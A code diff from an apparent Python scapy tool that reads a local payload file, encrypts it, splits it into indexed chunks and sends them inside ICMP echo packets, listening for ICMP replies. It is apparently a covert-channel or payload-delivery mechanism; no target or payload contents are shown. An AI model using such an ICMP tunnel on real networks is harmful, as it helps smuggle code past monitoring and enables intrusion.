@@ -34,17 +34,24 @@ def sniff_icmp():
     sniff(filter=fil, prn=handle_recv)
 
 
+TYPE_MESSAGE_ID = 3
+
+
 def get_payload_chunks() -> list[bytes]:
     with open("payload_code.py", "r") as f:
         payload = f.read()
         encrypted_payload = encrypt_payload(payload)
         chunks = []
+        chunk_index = 0
         for i in range(0, len(encrypted_payload) + 1, MAX_MESSAGE_SIZE):
-            chunk = encrypted_payload[i:i + MAX_MESSAGE_SIZE]
+            pre_data = f"{TYPE_MESSAGE_ID}{chunk_index}"
+            chunk = pre_data.encode() + encrypted_payload[i:i +
+                                                          MAX_MESSAGE_SIZE]
             # if len(chunk) < MAX_MESSAGE_SIZE:
             #     # add filler
             #     chunk += FILLER_STRING * (MAX_MESSAGE_SIZE - len(chunk))
             chunks.append(chunk)
+            chunk_index += 1
 
         return chunks
 
@@ -53,6 +60,8 @@ icmp_seq = 1
 
 
 def send_icmp(data: bytes):
+    global icmp_seq
+
     # the id comes from the current process id and doing a Internet checksum (used to identify the "session" or "process" sending the ping)
     icmp_id = os.getpid() & 0xFFFF
     # seq increments per sent packet, helps detect packet loss, track individual requests
@@ -62,12 +71,11 @@ def send_icmp(data: bytes):
 
     resp = sr1(icmp_packet, verbose=0, timeout=3)
 
+    icmp_seq += 1
     if resp:
         return resp
     else:
         return None
-
-    icmp_seq += 1
 
 
 def encrypt_payload(data: str) -> bytes:
